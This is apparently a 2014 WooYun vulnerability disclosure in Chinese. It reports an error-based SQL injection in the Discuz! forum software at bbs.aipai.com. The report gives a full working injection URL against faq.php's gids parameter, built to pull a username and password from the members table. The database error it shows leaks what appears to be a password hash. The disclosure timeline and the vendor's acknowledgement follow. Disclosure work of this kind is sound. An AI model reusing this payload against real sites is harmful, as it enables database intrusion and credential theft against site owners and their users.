wybug_detail: 漏洞详情 披露状态：   									2014-07-02：	细节已通知厂商并且等待厂商处理中									2014-07-06：	厂商已经确认，细节仅向厂商公开									2014-07-16：	细节向核心白帽子及相关领域专家公开									2014-07-26：	细节向普通白帽子公开									2014-08-05：	细节向实习白帽子公开									2014-08-16：	细节向公众公开  简要描述：  详细说明：  http://bbs.aipai.com/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=%29%20and%28select%201%20from%28select%20count%28*%29,concat%28floor%28rand%280%29*2%29,0x3a,%28select%28select%28SELECT%20concat%28username,0x3a,password%29FROM%20cdb_members%20limit%200,1%29%29from%20information_schema.tables%20limit%200,1%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%20and%201=1%23   漏洞证明：  Discuz! info: MySQL Query ErrorTime: 2014-7-2 5:01pmScript: /faq.phpSQL: SELECT * FROM [Table]usergroups u LEFT JOIN [Table]admingroups a ON u.groupid=a.admingid WHERE u.groupid IN ('7','\',') and(select 1 from(select count(*),concat(floor(rand(0)*2),0x3a,(select(select(SELECT concat(username,0x3a,password)FROM [Table]members limit 0,1))from information_schema.tables limit 0,1))x from information_schema.tables group by x)a) and 1=1#')Error: Duplicate entry '1:1:3e134ff36b7774fc2f83782e078c928d' for key 'group_key'Errno.: 1062Similar error report has been dispatched to administrator before.到 http://faq.comsenz.com 搜索此错误的解决方案   修复方案：     版权声明：转载请注明来源 mango@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：低 漏洞Rank：4  确认时间：2014-07-06 22:51 厂商回复： 非常感谢 最新状态： 暂无
